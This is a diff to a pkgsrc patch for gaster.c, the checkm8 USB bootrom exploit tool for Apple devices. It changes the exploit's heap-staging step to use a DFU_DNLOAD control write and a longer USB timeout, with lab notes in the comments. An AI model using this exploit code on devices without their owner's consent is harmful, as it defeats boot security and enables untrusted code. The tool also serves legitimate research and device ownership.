@@ -1,6 +1,6 @@
 $NetBSD$
 diff --git gaster.c gaster.c
-index b52b08d..cd03b40 100644
+index b52b08d..3222fad 100644
 --- gaster.c
 +++ gaster.c
 @@ -1,4 +1,5 @@
@@ -695,7 +695,7 @@ index b52b08d..cd03b40 100644
  				}
  			}
  			free(data);
-@@ -1228,20 +1760,219 @@ checkm8_stage_patch(const usb_handle_t *handle) {
+@@ -1228,20 +1760,214 @@ checkm8_stage_patch(const usb_handle_t *handle) {
  	return ret;
  }
  
@@ -837,21 +837,16 @@ index b52b08d..cd03b40 100644
 +		 * the lab combination that let the staging write park. */
 +		checkm8_hammer_cancel_delay(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_MAX_TRANSFER_SZ, 0, &p2);
 +		fprintf(stderr, "[p2] abort-dnload ok=%d ret=%d errno=%d\n", ok = true, (int)p2.ret, gaster_dbg_async_errno);
-+		/* Reference staging: park the DFU buffer at the overwrite
-+		 * offset with a plain (0,0) write. */
++		/* Lab 2026-10-24: the (0,0) staging write never parks on
++		 * this device and its timeout wound delays the pipe; the
++		 * DNLOAD form parks the full 0x580 in ~3 ms. */
 +		{
-+			int t10 = 10;
++			int t100 = 100;
 +
-+			(void)ioctl(handle->fd, USB_SET_TIMEOUT, &t10);
++			(void)ioctl(handle->fd, USB_SET_TIMEOUT, &t100);
 +		}
-+		ok = send_usb_control_request(handle, 0, 0, 0, 0, filler, 0x580, &p2);
-+		fprintf(stderr, "[p2] filler(0,0) ok=%d ret=%d sz=%u errno=%d\n", ok, (int)p2.ret, p2.sz, gaster_dbg_sync_errno);
-+		if(p2.ret != USB_TRANSFER_OK) {
-+			/* Distinguish a wrong staging request from a wrong
-+			 * heap state: try the DNLOAD form of the same write. */
-+			ok = send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, filler, 0x580, &p2);
-+			fprintf(stderr, "[p2] filler(dnload-fallback) ok=%d ret=%d sz=%u errno=%d\n", ok, (int)p2.ret, p2.sz, gaster_dbg_sync_errno);
-+		}
++		ok = send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, filler, 0x580, &p2);
++		fprintf(stderr, "[p2] filler(dnload) ok=%d ret=%d sz=%u errno=%d\n", ok, (int)p2.ret, p2.sz, gaster_dbg_sync_errno);
 +#else
 +		ok = send_usb_control_request_async_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_MAX_TRANSFER_SZ, 0, &p2);
 +		fprintf(stderr, "[p2] abort-dnload ok=%d ret=%d errno=%d\n", ok, (int)p2.ret, gaster_dbg_async_errno);
@@ -922,7 +917,7 @@ index b52b08d..cd03b40 100644
  			if(stage == STAGE_RESET) {
  				puts("Stage: RESET");
  				ret = checkm8_stage_reset(handle);
-@@ -1265,7 +1996,7 @@ gaster_checkm8(usb_handle_t *handle) {
+@@ -1265,7 +1991,7 @@ gaster_checkm8(usb_handle_t *handle) {
  				puts("ret: false");
  				stage = STAGE_RESET;
  			}
@@ -931,7 +926,7 @@ index b52b08d..cd03b40 100644
  		} else {
  			stage = STAGE_PWNED;
  			puts("Now you can boot untrusted images.");
-@@ -1412,7 +2143,7 @@ img4_init(const uint8_t *src, size_t src_len, img4_t *img4) {
+@@ -1412,7 +2138,7 @@ img4_init(const uint8_t *src, size_t src_len, img4_t *img4) {
  
  static bool
  aes_256_cbc_decrypt(const uint8_t *key, const uint8_t *iv, const uint8_t *data_src, uint8_t *data_dst, size_t data_sz) {
@@ -940,7 +935,7 @@ index b52b08d..cd03b40 100644
  	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
  	bool ret = false;
  	int out_sz;
-@@ -1628,10 +2359,20 @@ main(int argc, char **argv) {
+@@ -1628,10 +2354,20 @@ main(int argc, char **argv) {
  	int ret = EXIT_FAILURE;
  	usb_handle_t handle;
  
@@ -961,7 +956,7 @@ index b52b08d..cd03b40 100644
  	if(env_usb_abort_timeout_min == NULL || sscanf(env_usb_abort_timeout_min, "%u", &usb_abort_timeout_min) != 1 || usb_abort_timeout_min > usb_timeout) {
  		usb_abort_timeout_min = 0;
  	}
-@@ -1640,6 +2381,10 @@ main(int argc, char **argv) {
+@@ -1640,6 +2376,10 @@ main(int argc, char **argv) {
  		if(gaster_reset(&handle)) {
  			ret = 0;
  		}
@@ -972,7 +967,7 @@ index b52b08d..cd03b40 100644
  	} else if(argc == 2 && strcmp(argv[1], "pwn") == 0) {
  		if(gaster_checkm8(&handle)) {
  			ret = 0;
-@@ -1657,6 +2402,10 @@ main(int argc, char **argv) {
+@@ -1657,6 +2397,10 @@ main(int argc, char **argv) {
  		puts("env:");
  		puts("USB_TIMEOUT - USB timeout in ms");
  		puts("USB_ABORT_TIMEOUT_MIN - USB abort timeout minimum in ms");
